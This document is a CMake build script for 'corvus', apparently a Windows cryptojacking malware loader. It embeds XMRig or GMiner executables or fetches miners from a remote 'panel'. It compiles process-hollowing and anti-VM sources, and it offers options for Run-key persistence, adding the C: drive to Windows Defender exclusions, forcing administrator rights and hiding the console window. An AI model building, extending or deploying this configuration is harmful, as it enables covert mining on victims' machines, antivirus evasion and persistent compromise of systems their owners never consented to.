cmake_minimum_required(VERSION 3.10)
project(corvus)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Link MSVC runtime statically
if(MSVC)
    foreach(flag_var CMAKE_CXX_FLAGS CMAKE_CXX_FLAGS_DEBUG CMAKE_CXX_FLAGS_RELEASE CMAKE_CXX_FLAGS_MINSIZEREL CMAKE_CXX_FLAGS_RELWITHDEBINFO)
        if(${flag_var} MATCHES "/MD")
            string(REGEX REPLACE "/MD" "/MT" ${flag_var} "${${flag_var}}")
        endif()
        if(${flag_var} MATCHES "/MDd")
            string(REGEX REPLACE "/MDd" "/MTd" ${flag_var} "${${flag_var}}")
        endif()
    endforeach()
endif()

add_definitions(-DUNICODE -D_UNICODE)

# Optional Debug Console feature
option(ENABLE_DEBUG_CONSOLE "Enable debug console output" OFF)
if(ENABLE_DEBUG_CONSOLE)
    message(STATUS "Debug console enabled")
    add_definitions(-DENABLE_DEBUG_CONSOLE)
endif()

# Optional Anti-VM feature
option(ENABLE_ANTIVM "Enable Anti-VM detection" OFF)

# Optional Persistence feature
option(ENABLE_PERSISTENCE "Enable persistence via Run key" OFF)

# Optional Admin Manifest feature
option(ENABLE_ADMIN_MANIFEST "Require administrator privileges" OFF)
if(ENABLE_ADMIN_MANIFEST)
    message(STATUS "Admin manifest enabled - executable will require administrator privileges")
    add_definitions(-DENABLE_ADMIN_MANIFEST)
endif()

# Optional Windows Defender Exclusion feature
option(ENABLE_DEFENDER_EXCLUSION "Add C: drive to Windows Defender exclusion" OFF)
if(ENABLE_DEFENDER_EXCLUSION)
    message(STATUS "Windows Defender exclusion enabled - will add C: drive to exclusion list")
    add_definitions(-DENABLE_DEFENDER_EXCLUSION)
endif()

# Optional Remote Miners feature
option(ENABLE_REMOTE_MINERS "Download miners from panel instead of embedding" OFF)
if(ENABLE_REMOTE_MINERS)
    message(STATUS "Remote miners enabled - miners will be downloaded from panel")
    add_definitions(-DENABLE_REMOTE_MINERS)
endif()

# Optional GET Config URL feature (MUST be before embedded config generation)
set(CONFIG_GET_URL "" CACHE STRING "Direct GET URL for config fetching (instead of POST)")
if(CONFIG_GET_URL)
    message(STATUS "Config GET URL enabled: ${CONFIG_GET_URL}")
    add_definitions(-DCONFIG_GET_URL="${CONFIG_GET_URL}")
    message(STATUS "GET mode: Embedded fallback config will be used if available")
endif()

# Generate embedded config header from JSON
include(${CMAKE_CURRENT_SOURCE_DIR}/cmake/GenerateEmbeddedConfig.cmake)

# Accept config path from builder, with fallback to client resources
if(NOT DEFINED EMBEDDED_CONFIG_JSON_INPUT)
    set(EMBEDDED_CONFIG_JSON_INPUT "${CMAKE_CURRENT_SOURCE_DIR}/resources/embedded_config.json")
endif()

set(EMBEDDED_CONFIG_HEADER "${CMAKE_CURRENT_BINARY_DIR}/generated/embedded_config_generated.h")
if(EXISTS "${EMBEDDED_CONFIG_JSON_INPUT}")
    message(STATUS "Embedded config file found - generating header")
    message(STATUS "Using embedded config from: ${EMBEDDED_CONFIG_JSON_INPUT}")
    generate_embedded_config("${EMBEDDED_CONFIG_JSON_INPUT}" "${EMBEDDED_CONFIG_HEADER}")
    add_definitions(-DENABLE_EMBEDDED_CONFIG)
else()
    message(STATUS "Embedded config file not found - relying on CONFIG_GET_URL at runtime")
endif()

# Source files
set(SRC_FILES
    src/main.cpp
    src/util.cpp
    src/pe_hdrs_helper.cpp
    src/hollowing_parts.cpp
    src/delete_pending_file.cpp
    src/http_client.cpp
    src/json_printer.cpp
    src/process_info.cpp
    src/config_manager.cpp
)

# Resource files (only if not using remote miners)
if(NOT ENABLE_REMOTE_MINERS)
    # Generate RC file based on which miners are enabled
    set(GENERATED_RC "${CMAKE_CURRENT_BINARY_DIR}/embedded_resource_generated.rc")
    
    # Default to CPU miner if neither flag is explicitly set
    if(NOT DEFINED ENABLE_CPU_MINER)
        set(ENABLE_CPU_MINER ON)
    endif()
    if(NOT DEFINED ENABLE_GPU_MINER)
        set(ENABLE_GPU_MINER OFF)
    endif()
    
    # Build the RC file content
    set(RC_CONTENT "#include \"../include/resources.h\"\n")
    
    if(ENABLE_CPU_MINER)
        string(APPEND RC_CONTENT "EMBEDDED_XMRIG RCDATA \"${CMAKE_CURRENT_SOURCE_DIR}/resources/xmrig.exe\"\n")
        message(STATUS "Embedding CPU miner (XMRig) in resources")
        add_definitions(-DENABLE_CPU_MINER)
    endif()
    
    if(ENABLE_GPU_MINER)
        string(APPEND RC_CONTENT "EMBEDDED_GMINER RCDATA \"${CMAKE_CURRENT_SOURCE_DIR}/resources/gminer.exe\"\n")
        message(STATUS "Embedding GPU miner (GMiner) in resources")
        add_definitions(-DENABLE_GPU_MINER)
    endif()
    
    if(NOT ENABLE_CPU_MINER AND NOT ENABLE_GPU_MINER)
        message(WARNING "No miners enabled - at least one miner should be enabled for embedded builds")
    endif()
    
    # Write the generated RC file
    file(WRITE "${GENERATED_RC}" "${RC_CONTENT}")
    
    set(RESOURCE_FILES
        "${GENERATED_RC}"
    )
    message(STATUS "Embedding miner resources in executable")
else()
    set(RESOURCE_FILES)
    message(STATUS "Skipping resource embedding - using remote download")
endif()

# Header files
set(HEADER_FILES
    include/util.h
    include/kernel32_undoc.h
    include/ntddk.h
    include/pe_hdrs_helper.h
    include/hollowing_parts.h
    include/delete_pending_file.h
    include/http_client.h
    include/json_printer.h
    include/json.hpp
    include/process_info.h
    include/config_manager.h
)

# Add Anti-VM files if enabled
if(ENABLE_ANTIVM)
    message(STATUS "Anti-VM detection enabled")
    add_definitions(-DENABLE_ANTIVM)
    list(APPEND SRC_FILES src/antivm.cpp)
    list(APPEND HEADER_FILES include/antivm.h)
endif()

# Add Persistence files if enabled
if(ENABLE_PERSISTENCE)
    message(STATUS "Persistence enabled")
    add_definitions(-DENABLE_PERSISTENCE)
    list(APPEND SRC_FILES src/persistence.cpp)
    list(APPEND HEADER_FILES include/persistence.h)
endif()

# Miners are now embedded as resources in the executable
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS}")
if(MSVC)
    # Enable resource compilation for MSVC
    enable_language(RC)
endif()
if(NOT MSVC)
	set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -static")
	# Size optimization for Release builds with MinGW
	# -Os: optimize for size, -s: strip symbols, -Wl,--gc-sections: remove unused sections
	set(CMAKE_CXX_FLAGS_RELEASE "-Os -s -Wl,--gc-sections -fdata-sections -ffunction-sections")
	set(CMAKE_C_FLAGS_RELEASE "-Os -s -Wl,--gc-sections -fdata-sections -ffunction-sections")
endif()
set(CMAKE_FIND_LIBRARY_SUFFIXES ".a")

# Create executable - use WIN32 subsystem unless debug console is enabled
if(ENABLE_DEBUG_CONSOLE)
    add_executable(corvus 
        ${SRC_FILES}
        ${RESOURCE_FILES}
        ${HEADER_FILES}
    )
else()
    add_executable(corvus 
        WIN32
        ${SRC_FILES}
        ${RESOURCE_FILES}
        ${HEADER_FILES}
    )
endif()

# Set linker flags for GUI subsystem (hide console)
set_target_properties(corvus PROPERTIES
    OUTPUT_NAME corvus
)

if(MSVC)
	target_compile_options(corvus PRIVATE /W0)
else()
	target_compile_options(corvus PRIVATE -w)
endif()

# Link libraries
if(MSVC)
	target_link_libraries(corvus
		winhttp.lib
		ntdll.lib
		wbemuuid.lib
		ole32.lib
		oleaut32.lib
		iphlpapi.lib
	)
else()
	target_link_libraries(corvus
		-lwinhttp
		-lntdll
		-lwbemuuid
		-lole32
		-loleaut32
		-liphlpapi
	)
endif()

# Add admin manifest if enabled
if(ENABLE_ADMIN_MANIFEST)
	if(MSVC)
		set_target_properties(corvus PROPERTIES
			LINK_FLAGS "${LINK_FLAGS} /MANIFESTUAC:\"level=requireAdministrator uiAccess=false\""
		)
	endif()
endif()

# Include directories
target_include_directories(corvus PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/include
    ${CMAKE_CURRENT_BINARY_DIR}/generated
)

# Installation
install(TARGETS corvus
    DESTINATION ${CMAKE_INSTALL_PREFIX}
    COMPONENT corvus
)

add_custom_command(TARGET corvus POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E remove_directory ${CMAKE_BINARY_DIR}/CMakeFiles
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/CMakeCache.txt
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/cmake_install.cmake
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/Makefile
    COMMENT "Auto-removing CMake-generated files"
)

message(STATUS "Project configured for build")